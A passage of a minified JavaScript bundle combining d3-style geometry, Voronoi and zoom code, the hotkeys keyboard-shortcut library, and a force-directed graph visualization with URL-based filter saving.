t(+e)},n}(.5),Au.prototype={areaStart:function(){this._line=0},areaEnd:function(){this._line=NaN},lineStart:function(){this._x0=this._x1=this._x2=this._y0=this._y1=this._y2=NaN,this._l01_a=this._l12_a=this._l23_a=this._l01_2a=this._l12_2a=this._l23_2a=this._point=0},lineEnd:function(){(this._line||0!==this._line&&3===this._point)&&this._context.closePath(),this._line=1-this._line},point:function(t,e){if(t=+t,e=+e,this._point){var n=this._x2-t,r=this._y2-e;this._l23_a=Math.sqrt(this._l23_2a=Math.pow(n*n+r*r,this._alpha))}switch(this._point){case 0:this._point=1;break;case 1:this._point=2;break;case 2:this._point=3,this._line?this._context.lineTo(this._x2,this._y2):this._context.moveTo(this._x2,this._y2);break;case 3:this._point=4;default:ku(this,t,e)}this._l01_a=this._l12_a,this._l12_a=this._l23_a,this._l01_2a=this._l12_2a,this._l12_2a=this._l23_2a,this._x0=this._x1,this._x1=this._x2,this._x2=t,this._y0=this._y1,this._y1=this._y2,this._y2=e}},function t(e){function n(t){return e?new Au(t,e):new xu(t,0)}return n.alpha=function(e){return t(+e)},n}(.5),Tu.prototype={areaStart:function(){this._line=0},areaEnd:function(){this._line=NaN},lineStart:function(){this._x0=this._x1=this._y0=this._y1=this._t0=NaN,this._point=0},lineEnd:function(){switch(this._point){case 2:this._context.lineTo(this._x1,this._y1);break;case 3:Cu(this,this._t0,Nu(this,this._t0))}(this._line||0!==this._line&&1===this._point)&&this._context.closePath(),this._line=1-this._line},point:function(t,e){var n=NaN;if(e=+e,(t=+t)!==this._x1||e!==this._y1){switch(this._point){case 0:this._point=1,this._line?this._context.lineTo(t,e):this._context.moveTo(t,e);break;case 1:this._point=2;break;case 2:this._point=3,Cu(this,Nu(this,n=Lu(this,t,e)),n);break;default:Cu(this,this._t0,n=Lu(this,t,e))}this._x0=this._x1,this._x1=t,this._y0=this._y1,this._y1=e,this._t0=n}}},(function(t){this._context=new Gu(t)}.prototype=Object.create(Tu.prototype)).point=function(t,e){Tu.prototype.point.call(this,e,t)},Gu.prototype={moveTo:function(t,e){this._context.moveTo(e,t)},closePath:function(){this._context.closePath()},lineTo:function(t,e){this._context.lineTo(e,t)},bezierCurveTo:function(t,e,n,r,i,o){this._context.bezierCurveTo(e,t,r,n,o,i)}},Uu.prototype={constructor:Uu,insert:function(t,e){var n,r,i;if(t){if(e.P=t,e.N=t.N,t.N&&(t.N.P=e),t.N=e,t.R){for(t=t.R;t.L;)t=t.L;t.L=e}else t.R=e;n=t}else this._?(t=zu(this._),e.P=null,e.N=t,t.P=t.L=e,n=t):(e.P=e.N=null,this._=e,n=null);for(e.L=e.R=null,e.U=n,e.C=!0,t=e;n&&n.C;)n===(r=n.U).L?(i=r.R)&&i.C?(n.C=i.C=!1,r.C=!0,t=r):(t===n.R&&(Ou(this,n),n=(t=n).U),n.C=!1,r.C=!0,ju(this,r)):(i=r.L)&&i.C?(n.C=i.C=!1,r.C=!0,t=r):(t===n.L&&(ju(this,n),n=(t=n).U),n.C=!1,r.C=!0,Ou(this,r)),n=t.U;this._.C=!1},remove:function(t){t.N&&(t.N.P=t.P),t.P&&(t.P.N=t.N),t.N=t.P=null;var e,n,r,i=t.U,o=t.L,a=t.R;if(n=o?a?zu(a):o:a,i?i.L===t?i.L=n:i.R=n:this._=n,o&&a?(r=n.C,n.C=t.C,n.L=o,o.U=n,n!==a?(i=n.U,n.U=t.U,t=n.R,i.L=t,n.R=a,a.U=n):(n.U=i,i=n,t=n.R)):(r=t.C,t=n),t&&(t.U=i),!r)if(t&&t.C)t.C=!1;else{do{if(t===this._)break;if(t===i.L){if((e=i.R).C&&(e.C=!1,i.C=!0,Ou(this,i),e=i.R),e.L&&e.L.C||e.R&&e.R.C){e.R&&e.R.C||(e.L.C=!1,e.C=!0,ju(this,e),e=i.R),e.C=i.C,i.C=e.R.C=!1,Ou(this,i),t=this._;break}}else if((e=i.L).C&&(e.C=!1,i.C=!0,ju(this,i),e=i.L),e.L&&e.L.C||e.R&&e.R.C){e.L&&e.L.C||(e.R.C=!1,e.C=!0,Ou(this,e),e=i.L),e.C=i.C,i.C=e.L.C=!1,ju(this,i),t=this._;break}e.C=!0,t=i,i=i.U}while(!t.C);t&&(t.C=!1)}}};const Pu=Uu;function Iu(t,e,n,r){var i=[null,null],o=sc.push(i)-1;return i.left=t,i.right=e,n&&Fu(i,t,e,n),r&&Fu(i,e,t,r),uc[t.index].halfedges.push(o),uc[e.index].halfedges.push(o),i}function Ru(t,e,n){var r=[e,n];return r.left=t,r}function Fu(t,e,n,r){t[0]||t[1]?t.left===n?t[1]=r:t[0]=r:(t[0]=r,t.left=e,t.right=n)}function qu(t,e,n,r,i){var o,a=t[0],u=t[1],c=a[0],s=a[1],h=0,f=1,l=u[0]-c,d=u[1]-s;if(o=e-c,l||!(o>0)){if(o/=l,l<0){if(o<h)return;o<f&&(f=o)}else if(l>0){if(o>f)return;o>h&&(h=o)}if(o=r-c,l||!(o<0)){if(o/=l,l<0){if(o>f)return;o>h&&(h=o)}else if(l>0){if(o<h)return;o<f&&(f=o)}if(o=n-s,d||!(o>0)){if(o/=d,d<0){if(o<h)return;o<f&&(f=o)}else if(d>0){if(o>f)return;o>h&&(h=o)}if(o=i-s,d||!(o<0)){if(o/=d,d<0){if(o>f)return;o>h&&(h=o)}else if(d>0){if(o<h)return;o<f&&(f=o)}return!(h>0||f<1)||(h>0&&(t[0]=[c+h*l,s+h*d]),f<1&&(t[1]=[c+f*l,s+f*d]),!0)}}}}}function Bu(t,e,n,r,i){var o=t[1];if(o)return!0;var a,u,c=t[0],s=t.left,h=t.right,f=s[0],l=s[1],d=h[0],p=h[1],y=(f+d)/2,g=(l+p)/2;if(p===l){if(y<e||y>=r)return;if(f>d){if(c){if(c[1]>=i)return}else c=[y,n];o=[y,i]}else{if(c){if(c[1]<n)return}else c=[y,i];o=[y,n]}}else if(u=g-(a=(f-d)/(p-l))*y,a<-1||a>1)if(f>d){if(c){if(c[1]>=i)return}else c=[(n-u)/a,n];o=[(i-u)/a,i]}else{if(c){if(c[1]<n)return}else c=[(i-u)/a,i];o=[(n-u)/a,n]}else if(l<p){if(c){if(c[0]>=r)return}else c=[e,a*e+u];o=[r,a*r+u]}else{if(c){if(c[0]<e)return}else c=[r,a*r+u];o=[e,a*e+u]}return t[0]=c,t[1]=o,!0}function Yu(t,e){var n=t.site,r=e.left,i=e.right;return n===i&&(i=r,r=n),i?Math.atan2(i[1]-r[1],i[0]-r[0]):(n===r?(r=e[1],i=e[0]):(r=e[0],i=e[1]),Math.atan2(r[0]-i[0],i[1]-r[1]))}function Wu(t,e){return e[+(e.left!==t.site)]}function Ku(t,e){return e[+(e.left===t.site)]}var Hu,Xu=[];function $u(){Du(this),this.x=this.y=this.arc=this.site=this.cy=null}function Vu(t){var e=t.P,n=t.N;if(e&&n){var r=e.site,i=t.site,o=n.site;if(r!==o){var a=i[0],u=i[1],c=r[0]-a,s=r[1]-u,h=o[0]-a,f=o[1]-u,l=2*(c*f-s*h);if(!(l>=-fc)){var d=c*c+s*s,p=h*h+f*f,y=(f*d-s*p)/l,g=(c*p-h*d)/l,v=Xu.pop()||new $u;v.arc=t,v.site=i,v.x=y+a,v.y=(v.cy=g+u)+Math.sqrt(y*y+g*g),t.circle=v;for(var m=null,_=cc._;_;)if(v.y<_.y||v.y===_.y&&v.x<=_.x){if(!_.L){m=_.P;break}_=_.L}else{if(!_.R){m=_;break}_=_.R}cc.insert(m,v),m||(Hu=v)}}}}function Zu(t){var e=t.circle;e&&(e.P||(Hu=e.N),cc.remove(e),Xu.push(e),Du(e),t.circle=null)}var Ju=[];function Qu(){Du(this),this.edge=this.site=this.circle=null}function tc(t){var e=Ju.pop()||new Qu;return e.site=t,e}function ec(t){Zu(t),ac.remove(t),Ju.push(t),Du(t)}function nc(t){var e=t.circle,n=e.x,r=e.cy,i=[n,r],o=t.P,a=t.N,u=[t];ec(t);for(var c=o;c.circle&&Math.abs(n-c.circle.x)<hc&&Math.abs(r-c.circle.cy)<hc;)o=c.P,u.unshift(c),ec(c),c=o;u.unshift(c),Zu(c);for(var s=a;s.circle&&Math.abs(n-s.circle.x)<hc&&Math.abs(r-s.circle.cy)<hc;)a=s.N,u.push(s),ec(s),s=a;u.push(s),Zu(s);var h,f=u.length;for(h=1;h<f;++h)s=u[h],c=u[h-1],Fu(s.edge,c.site,s.site,i);c=u[0],(s=u[f-1]).edge=Iu(c.site,s.site,null,i),Vu(c),Vu(s)}function rc(t){for(var e,n,r,i,o=t[0],a=t[1],u=ac._;u;)if((r=ic(u,a)-o)>hc)u=u.L;else{if(!((i=o-oc(u,a))>hc)){r>-hc?(e=u.P,n=u):i>-hc?(e=u,n=u.N):e=n=u;break}if(!u.R){e=u;break}u=u.R}!function(t){uc[t.index]={site:t,halfedges:[]}}(t);var c=tc(t);if(ac.insert(e,c),e||n){if(e===n)return Zu(e),n=tc(e.site),ac.insert(c,n),c.edge=n.edge=Iu(e.site,c.site),Vu(e),void Vu(n);if(n){Zu(e),Zu(n);var s=e.site,h=s[0],f=s[1],l=t[0]-h,d=t[1]-f,p=n.site,y=p[0]-h,g=p[1]-f,v=2*(l*g-d*y),m=l*l+d*d,_=y*y+g*g,b=[(g*m-d*_)/v+h,(l*_-y*m)/v+f];Fu(n.edge,s,p,b),c.edge=Iu(s,t,null,b),n.edge=Iu(t,p,null,b),Vu(e),Vu(n)}else c.edge=Iu(e.site,c.site)}}function ic(t,e){var n=t.site,r=n[0],i=n[1],o=i-e;if(!o)return r;var a=t.P;if(!a)return-1/0;var u=(n=a.site)[0],c=n[1],s=c-e;if(!s)return u;var h=u-r,f=1/o-1/s,l=h/s;return f?(-l+Math.sqrt(l*l-2*f*(h*h/(-2*s)-c+s/2+i-o/2)))/f+r:(r+u)/2}function oc(t,e){var n=t.N;if(n)return ic(n,e);var r=t.site;return r[1]===e?r[0]:1/0}var ac,uc,cc,sc,hc=1e-6,fc=1e-12;function lc(t,e){return e[1]-t[1]||e[0]-t[0]}function dc(t,e){var n,r,i,o=t.sort(lc).pop();for(sc=[],uc=new Array(t.length),ac=new Pu,cc=new Pu;;)if(i=Hu,o&&(!i||o[1]<i.y||o[1]===i.y&&o[0]<i.x))o[0]===n&&o[1]===r||(rc(o),n=o[0],r=o[1]),o=t.pop();else{if(!i)break;nc(i.arc)}if(function(){for(var t,e,n,r,i=0,o=uc.length;i<o;++i)if((t=uc[i])&&(r=(e=t.halfedges).length)){var a=new Array(r),u=new Array(r);for(n=0;n<r;++n)a[n]=n,u[n]=Yu(t,sc[e[n]]);for(a.sort((function(t,e){return u[e]-u[t]})),n=0;n<r;++n)u[n]=e[a[n]];for(n=0;n<r;++n)e[n]=u[n]}}(),e){var a=+e[0][0],u=+e[0][1],c=+e[1][0],s=+e[1][1];!function(t,e,n,r){for(var i,o=sc.length;o--;)Bu(i=sc[o],t,e,n,r)&&qu(i,t,e,n,r)&&(Math.abs(i[0][0]-i[1][0])>hc||Math.abs(i[0][1]-i[1][1])>hc)||delete sc[o]}(a,u,c,s),function(t,e,n,r){var i,o,a,u,c,s,h,f,l,d,p,y,g=uc.length,v=!0;for(i=0;i<g;++i)if(o=uc[i]){for(a=o.site,u=(c=o.halfedges).length;u--;)sc[c[u]]||c.splice(u,1);for(u=0,s=c.length;u<s;)p=(d=Ku(o,sc[c[u]]))[0],y=d[1],f=(h=Wu(o,sc[c[++u%s]]))[0],l=h[1],(Math.abs(p-f)>hc||Math.abs(y-l)>hc)&&(c.splice(u,0,sc.push(Ru(a,d,Math.abs(p-t)<hc&&r-y>hc?[t,Math.abs(f-t)<hc?l:r]:Math.abs(y-r)<hc&&n-p>hc?[Math.abs(l-r)<hc?f:n,r]:Math.abs(p-n)<hc&&y-e>hc?[n,Math.abs(f-n)<hc?l:e]:Math.abs(y-e)<hc&&p-t>hc?[Math.abs(l-e)<hc?f:t,e]:null))-1),++s);s&&(v=!1)}if(v){var m,_,b,w=1/0;for(i=0,v=null;i<g;++i)(o=uc[i])&&(b=(m=(a=o.site)[0]-t)*m+(_=a[1]-e)*_)<w&&(w=b,v=o);if(v){var x=[t,e],k=[t,r],M=[n,r],E=[n,e];v.halfedges.push(sc.push(Ru(a=v.site,x,k))-1,sc.push(Ru(a,k,M))-1,sc.push(Ru(a,M,E))-1,sc.push(Ru(a,E,x))-1)}}for(i=0;i<g;++i)(o=uc[i])&&(o.halfedges.length||delete uc[i])}(a,u,c,s)}this.edges=sc,this.cells=uc,ac=cc=sc=uc=null}function pc(t){return function(){return t}}function yc(t,e,n){this.target=t,this.type=e,this.transform=n}function gc(t,e,n){this.k=t,this.x=e,this.y=n}dc.prototype={constructor:dc,polygons:function(){var t=this.edges;return this.cells.map((function(e){var n=e.halfedges.map((function(n){return Wu(e,t[n])}));return n.data=e.site.data,n}))},triangles:function(){var t=[],e=this.edges;return this.cells.forEach((function(n,r){if(o=(i=n.halfedges).length)for(var i,o,a,u=n.site,c=-1,s=e[i[o-1]],h=s.left===u?s.right:s.left;++c<o;)a=h,h=(s=e[i[c]]).left===u?s.right:s.left,a&&h&&r<a.index&&r<h.index&&(l=a,d=h,((f=u)[0]-d[0])*(l[1]-f[1])-(f[0]-l[0])*(d[1]-f[1])<0)&&t.push([u.data,a.data,h.data]);var f,l,d})),t},links:function(){return this.edges.filter((function(t){return t.right})).map((function(t){return{source:t.left.data,target:t.right.data}}))},find:function(t,e,n){for(var r,i,o=this,a=o._found||0,u=o.cells.length;!(i=o.cells[a]);)if(++a>=u)return null;var c=t-i.site[0],s=e-i.site[1],h=c*c+s*s;do{i=o.cells[r=a],a=null,i.halfedges.forEach((function(n){var r=o.edges[n],u=r.left;if(u!==i.site&&u||(u=r.right)){var c=t-u[0],s=e-u[1],f=c*c+s*s;f<h&&(h=f,a=u.index)}}))}while(null!==a);return o._found=r,null==n||h<=n*n?i.site:null}},gc.prototype={constructor:gc,scale:function(t){return 1===t?this:new gc(this.k*t,this.x,this.y)},translate:function(t,e){return 0===t&0===e?this:new gc(this.k,this.x+this.k*t,this.y+this.k*e)},apply:function(t){return[t[0]*this.k+this.x,t[1]*this.k+this.y]},applyX:function(t){return t*this.k+this.x},applyY:function(t){return t*this.k+this.y},invert:function(t){return[(t[0]-this.x)/this.k,(t[1]-this.y)/this.k]},invertX:function(t){return(t-this.x)/this.k},invertY:function(t){return(t-this.y)/this.k},rescaleX:function(t){return t.copy().domain(t.range().map(this.invertX,this).map(t.invert,t))},rescaleY:function(t){return t.copy().domain(t.range().map(this.invertY,this).map(t.invert,t))},toString:function(){return"translate("+this.x+","+this.y+") scale("+this.k+")"}};var vc=new gc(1,0,0);function mc(){yt.stopImmediatePropagation()}function _c(){yt.preventDefault(),yt.stopImmediatePropagation()}function bc(){return!yt.button}function wc(){var t,e,n=this;return n instanceof SVGElement?(t=(n=n.ownerSVGElement||n).width.baseVal.value,e=n.height.baseVal.value):(t=n.clientWidth,e=n.clientHeight),[[0,0],[t,e]]}function xc(){return this.__zoom||vc}function kc(){return-yt.deltaY*(yt.deltaMode?120:1)/500}function Mc(){return"ontouchstart"in this}function Ec(t,e,n){var r=t.invertX(e[0][0])-n[0][0],i=t.invertX(e[1][0])-n[1][0],o=t.invertY(e[0][1])-n[0][1],a=t.invertY(e[1][1])-n[1][1];return t.translate(i>r?(r+i)/2:Math.min(0,r)||Math.max(0,i),a>o?(o+a)/2:Math.min(0,o)||Math.max(0,a))}function Ac(t){return Ac="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t},Ac(t)}function Sc(t,e){for(var n=0;n<e.length;n++){var r=e[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(t,Cc(r.key),r)}}function Lc(t,e,n){return e&&Sc(t.prototype,e),n&&Sc(t,n),Object.defineProperty(t,"prototype",{writable:!1}),t}function Nc(t,e,n){return(e=Cc(e))in t?Object.defineProperty(t,e,{value:n,enumerable:!0,configurable:!0,writable:!0}):t[e]=n,t}function Cc(t){var e=function(t,e){if("object"!==Ac(t)||null===t)return t;var n=t[Symbol.toPrimitive];if(void 0!==n){var r=n.call(t,"string");if("object"!==Ac(r))return r;throw new TypeError("@@toPrimitive must return a primitive value.")}return String(t)}(t);return"symbol"===Ac(e)?e:String(e)}gc.prototype;var Tc=Lc((function t(){!function(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}(this,t)}));Nc(Tc,"highlightedNodes",[]),Nc(Tc,"focusMode",!1),Nc(Tc,"position",{x:0,y:0,zoom:1}),window.addEventListener("DOMContentLoaded",(function(){document.getElementById("view-save").addEventListener("click",(function(){var t=new URL(window.location),e=Array.from(document.querySelectorAll("#types-form input:checked")).map((function(t){return t.name})),n=Array.from(document.querySelectorAll("#tags-form input:checked")).map((function(t){return t.name})),r=document.getElementById("focus-input").value;e.length>0&&t.searchParams.set("filters",e.join("-")),n.length>0&&t.searchParams.set("tags",n.join("-")),document.querySelector("#focus-check:checked")&&t.searchParams.set("focus",r),window.location.replace(t)}))}));var Gc="undefined"!=typeof navigator&&navigator.userAgent.toLowerCase().indexOf("firefox")>0;function Uc(t,e,n,r){t.addEventListener?t.addEventListener(e,n,r):t.attachEvent&&t.attachEvent("on".concat(e),(function(){n(window.event)}))}function Dc(t,e){for(var n=e.slice(0,e.length-1),r=0;r<n.length;r++)n[r]=t[n[r].toLowerCase()];return n}function Oc(t){"string"!=typeof t&&(t="");for(var e=(t=t.replace(/\s/g,"")).split(","),n=e.lastIndexOf("");n>=0;)e[n-1]+=",",e.splice(n,1),n=e.lastIndexOf("");return e}for(var jc={backspace:8,"⌫":8,tab:9,clear:12,enter:13,"↩":13,return:13,esc:27,escape:27,space:32,left:37,up:38,right:39,down:40,del:46,delete:46,ins:45,insert:45,home:36,end:35,pageup:33,pagedown:34,capslock:20,num_0:96,num_1:97,num_2:98,num_3:99,num_4:100,num_5:101,num_6:102,num_7:103,num_8:104,num_9:105,num_multiply:106,num_add:107,num_enter:108,num_subtract:109,num_decimal:110,num_divide:111,"⇪":20,",":188,".":190,"/":191,"`":192,"-":Gc?173:189,"=":Gc?61:187,";":Gc?59:186,"'":222,"[":219,"]":221,"\\":220},zc={"⇧":16,shift:16,"⌥":18,alt:18,option:18,"⌃":17,ctrl:17,control:17,"⌘":91,cmd:91,command:91},Pc={16:"shiftKey",18:"altKey",17:"ctrlKey",91:"metaKey",shiftKey:16,ctrlKey:17,altKey:18,metaKey:91},Ic={16:!1,18:!1,17:!1,91:!1},Rc={},Fc=1;Fc<20;Fc++)jc["f".concat(Fc)]=111+Fc;var qc=[],Bc=!1,Yc="all",Wc=[],Kc=function(t){return jc[t.toLowerCase()]||zc[t.toLowerCase()]||t.toUpperCase().charCodeAt(0)};function Hc(t){Yc=t||"all"}function Xc(){return Yc||"all"}var $c=function(t){var e=t.key,n=t.scope,r=t.method,i=t.splitKey,o=void 0===i?"+":i;Oc(e).forEach((function(t){var e=t.split(o),i=e.length,a=e[i-1],u="*"===a?"*":Kc(a);if(Rc[u]){n||(n=Xc());var c=i>1?Dc(zc,e):[];Rc[u]=Rc[u].filter((function(t){return!((!r||t.method===r)&&t.scope===n&&function(t,e){for(var n=t.length>=e.length?t:e,r=t.length>=e.length?e:t,i=!0,o=0;o<n.length;o++)-1===r.indexOf(n[o])&&(i=!1);return i}(t.mods,c))}))}}))};function Vc(t,e,n,r){var i;if(e.element===r&&(e.scope===n||"all"===e.scope)){for(var o in i=e.mods.length>0,Ic)Object.prototype.hasOwnProperty.call(Ic,o)&&(!Ic[o]&&e.mods.indexOf(+o)>-1||Ic[o]&&-1===e.mods.indexOf(+o))&&(i=!1);(0!==e.mods.length||Ic[16]||Ic[18]||Ic[17]||Ic[91])&&!i&&"*"!==e.shortcut||(e.keys=[],e.keys=e.keys.concat(qc),!1===e.method(t,e)&&(t.preventDefault?t.preventDefault():t.returnValue=!1,t.stopPropagation&&t.stopPropagation(),t.cancelBubble&&(t.cancelBubble=!0)))}}function Zc(t,e){var n=Rc["*"],r=t.keyCode||t.which||t.charCode;if(Jc.filter.call(this,t)){if(93!==r&&224!==r||(r=91),-1===qc.indexOf(r)&&229!==r&&qc.push(r),["ctrlKey","altKey","shiftKey","metaKey"].forEach((function(e){var n=Pc[e];t[e]&&-1===qc.indexOf(n)?qc.push(n):!t[e]&&qc.indexOf(n)>-1?qc.splice(qc.indexOf(n),1):"metaKey"===e&&t[e]&&3===qc.length&&(t.ctrlKey||t.shiftKey||t.altKey||(qc=qc.slice(qc.indexOf(n))))})),r in Ic){for(var i in Ic[r]=!0,zc)zc[i]===r&&(Jc[i]=!0);if(!n)return}for(var o in Ic)Object.prototype.hasOwnProperty.call(Ic,o)&&(Ic[o]=t[Pc[o]]);t.getModifierState&&(!t.altKey||t.ctrlKey)&&t.getModifierState("AltGraph")&&(-1===qc.indexOf(17)&&qc.push(17),-1===qc.indexOf(18)&&qc.push(18),Ic[17]=!0,Ic[18]=!0);var a=Xc();if(n)for(var u=0;u<n.length;u++)n[u].scope===a&&("keydown"===t.type&&n[u].keydown||"keyup"===t.type&&n[u].keyup)&&Vc(t,n[u],a,e);if(r in Rc)for(var c=0;c<Rc[r].length;c++)if(("keydown"===t.type&&Rc[r][c].keydown||"keyup"===t.type&&Rc[r][c].keyup)&&Rc[r][c].key){for(var s=Rc[r][c],h=s.splitKey,f=s.key.split(h),l=[],d=0;d<f.length;d++)l.push(Kc(f[d]));l.sort().join("")===qc.sort().join("")&&Vc(t,s,a,e)}}}function Jc(t,e,n){qc=[];var r=Oc(t),i=[],o="all",a=document,u=0,c=!1,s=!0,h="+",f=!1;for(void 0===n&&"function"==typeof e&&(n=e),"[object Object]"===Object.prototype.toString.call(e)&&(e.scope&&(o=e.scope),e.element&&(a=e.element),e.keyup&&(c=e.keyup),void 0!==e.keydown&&(s=e.keydown),void 0!==e.capture&&(f=e.capture),"string"==typeof e.splitKey&&(h=e.splitKey)),"string"==typeof e&&(o=e);u<r.length;u++)i=[],(t=r[u].split(h)).length>1&&(i=Dc(zc,t)),(t="*"===(t=t[t.length-1])?"*":Kc(t))in Rc||(Rc[t]=[]),Rc[t].push({keyup:c,keydown:s,scope:o,mods:i,shortcut:r[u],method:n,key:r[u],splitKey:h,element:a});void 0!==a&&!function(t){return Wc.indexOf(t)>-1}(a)&&window&&(Wc.push(a),Uc(a,"keydown",(function(t){Zc(t,a)}),f),Bc||(Bc=!0,Uc(window,"focus",(function(){qc=[]}),f)),Uc(a,"keyup",(function(t){Zc(t,a),function(t){var e=t.keyCode||t.which||t.charCode,n=qc.indexOf(e);if(n>=0&&qc.splice(n,1),t.key&&"meta"===t.key.toLowerCase()&&qc.splice(0,qc.length),93!==e&&224!==e||(e=91),e in Ic)for(var r in Ic[e]=!1,zc)zc[r]===e&&(Jc[r]=!1)}(t)}),f))}var Qc={getPressedKeyString:function(){return qc.map((function(t){return e=t,Object.keys(jc).find((function(t){return jc[t]===e}))||function(t){return Object.keys(zc).find((function(e){return zc[e]===t}))}(t)||String.fromCharCode(t);var e}))},setScope:Hc,getScope:Xc,deleteScope:function(t,e){var n,r;for(var i in t||(t=Xc()),Rc)if(Object.prototype.hasOwnProperty.call(Rc,i))for(n=Rc[i],r=0;r<n.length;)n[r].scope===t?n.splice(r,1):r++;Xc()===t&&Hc(e||"all")},getPressedKeyCodes:function(){return qc.slice(0)},getAllKeyCodes:function(){var t=[];return Object.keys(Rc).forEach((function(e){Rc[e].forEach((function(e){var n=e.key,r=e.scope,i=e.mods,o=e.shortcut;t.push({scope:r,shortcut:o,mods:i,keys:n.split("+").map((function(t){return Kc(t)}))})}))})),t},isPressed:function(t){return"string"==typeof t&&(t=Kc(t)),-1!==qc.indexOf(t)},filter:function(t){var e=t.target||t.srcElement,n=e.tagName,r=!0;return!e.isContentEditable&&("INPUT"!==n&&"TEXTAREA"!==n&&"SELECT"!==n||e.readOnly)||(r=!1),r},trigger:function(t){var e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"all";Object.keys(Rc).forEach((function(n){Rc[n].filter((function(n){return n.scope===e&&n.shortcut===t})).forEach((function(t){t&&t.method&&t.method()}))}))},unbind:function(t){if(void 0===t)Object.keys(Rc).forEach((function(t){return delete Rc[t]}));else if(Array.isArray(t))t.forEach((function(t){t.key&&$c(t)}));else if("object"==typeof t)t.key&&$c(t);else if("string"==typeof t){for(var e=arguments.length,n=new Array(e>1?e-1:0),r=1;r<e;r++)n[r-1]=arguments[r];var i=n[0],o=n[1];"function"==typeof i&&(o=i,i=""),$c({key:t,scope:i,method:o,splitKey:"+"})}},keyMap:jc,modifier:zc,modifierMap:Pc};for(var ts in Qc)Object.prototype.hasOwnProperty.call(Qc,ts)&&(Jc[ts]=Qc[ts]);if("undefined"!=typeof window){var es=window.hotkeys;Jc.noConflict=function(t){return t&&window.hotkeys===Jc&&(window.hotkeys=es),Jc},window.hotkeys=Jc}const ns={notFiltered:0,filteredByTimeline:1,filteredByFocus:2,filteredByTag:3,filteredByType:4};var rs=[];data.nodes=data.nodes.map((function(t){return rs.push(t.id),t.hidden=ns.notFiltered,t.isolated=!1,t.highlighted=!1,t}));var is=Lt("#graph-canvas"),os=is.append("svg"),as=is.node().getBoundingClientRect(),us=as.width,cs=as.height;os.attr("viewBox",[0,0,us,cs]);var ss=function(t){var e,n=1,r=.001,i=1-Math.pow(r,1/300),o=0,a=.6,u=Tr(),c=Dn(h),s=p("tick","end");function h(){f(),s.call("tick",e),n<r&&(c.stop(),s.call("end",e))}function f(){var e,r,c=t.length;for(n+=(o-n)*i,u.each((function(t){t(n)})),e=0;e<c;++e)null==(r=t[e]).fx?r.x+=r.vx*=a:(r.x=r.fx,r.vx=0),null==r.fy?r.y+=r.vy*=a:(r.y=r.fy,r.vy=0)}function l(){for(var e,n=0,r=t.length;n<r;++n){if((e=t[n]).index=n,isNaN(e.x)||isNaN(e.y)){var i=10*Math.sqrt(n),o=n*ri;e.x=i*Math.cos(o),e.y=i*Math.sin(o)}(isNaN(e.vx)||isNaN(e.vy))&&(e.vx=e.vy=0)}}function d(e){return e.initialize&&e.initialize(t),e}return null==t&&(t=[]),l(),e={tick:f,restart:function(){return c.restart(h),e},stop:function(){return c.stop(),e},nodes:function(n){return arguments.length?(t=n,l(),u.each(d),e):t},alpha:function(t){return arguments.length?(n=+t,e):n},alphaMin:function(t){return arguments.length?(r=+t,e):r},alphaDecay:function(t){return arguments.length?(i=+t,e):+i},alphaTarget:function(t){return arguments.length?(o=+t,e):o},velocityDecay:function(t){return arguments.length?(a=1-t,e):1-a},force:function(t,n){return arguments.length>1?(null==n?u.remove(t):u.set(t,d(n)),e):u.get(t)},find:function(e,n,r){var i,o,a,u,c,s=0,h=t.length;for(null==r?r=1/0:r*=r,s=0;s<h;++s)(a=(i=e-(u=t[s]).x)*i+(o=n-u.y)*o)<r&&(c=u,r=a);return c},on:function(t,n){return arguments.length>1?(s.on(t,n),e):s.on(t)}}}(data.nodes).force("link",function(t){var e,n,r,i,o,a=Jr,u=function(t){return 1/Math.min(i[t.source.index],i[t.target.index])},c=Vr(30),s=1;function h(r){for(var i=0,a=t.length;i<s;++i)for(var u,c,h,f,l,d,p,y=0;y<a;++y)c=(u=t[y]).source,f=(h=u.target).x+h.vx-c.x-c.vx||Zr(),l=h.y+h.vy-c.y-c.vy||Zr(),f*=d=((d=Math.sqrt(f*f+l*l))-n[y])/d*r*e[y],l*=d,h.vx-=f*(p=o[y]),h.vy-=l*p,c.vx+=f*(p=1-p),c.vy+=l*p}function f(){if(r){var u,c,s=r.length,h=t.length,f=Tr(r,a);for(u=0,i=new Array(s);u<h;++u)(c=t[u]).index=u,"object"!=typeof c.source&&(c.source=Qr(f,c.source)),"object"!=typeof c.target&&(c.target=Qr(f,c.target)),i[c.source.index]=(i[c.source.index]||0)+1,i[c.target.index]=(i[c.target.index]||0)+1;for(u=0,o=new Array(h);u<h;++u)c=t[u],o[u]=i[c.source.index]/(i[c.source.index]+i[c.target.index]);e=new Array(h),l(),n=new Array(h),d()}}function l(){if(r)for(var n=0,i=t.length;n<i;++n)e[n]=+u(t[n],n,t)}function d(){if(r)for(var e=0,i=t.length;e<i;++e)n[e]=+c(t[e],e,t)}return null==t&&(t=[]),h.initialize=function(t){r=t,f()},h.links=function(e){return arguments.length?(t=e,f(),h):t},h.id=function(t){return arguments.length?(a=t,h):a},h.iterations=function(t){return arguments.length?(s=+t,h):s},h.strength=function(t){return arguments.length?(u="function"==typeof t?t:Vr(+t),l(),h):u},h.distance=function(t){return arguments.length?(c="function"==typeof t?t:Vr(+t),d(),h):c},h}(data.links).id((function(t){return t.id}))).force("charge",function(){var t,e,n,r,i=Vr(-30),o=1,a=1/0,u=.81;function c(r){var i,o=t.length,a=Kr(t,ti,ei).visitAfter(h);for(n=r,i=0;i<o;++i)e=t[i],a.visit(f)}function s(){if(t){var e,n,o=t.length;for(r=new Array(o),e=0;e<o;++e)n=t[e],r[n.index]=+i(n,e,t)}}function h(t){var e,n,i,o,a,u=0,c=0;if(t.length){for(i=o=a=0;a<4;++a)(e=t[a])&&(n=Math.abs(e.value))&&(u+=e.value,c+=n,i+=n*e.x,o+=n*e.y);t.x=i/c,t.y=o/c}else{(e=t).x=e.data.x,e.y=e.data.y;do{u+=r[e.data.index]}while(e=e.next)}t.value=u}function f(t,i,c,s){if(!t.value)return!0;var h=t.x-e.x,f=t.y-e.y,l=s-i,d=h*h+f*f;if(l*l/u<d)return 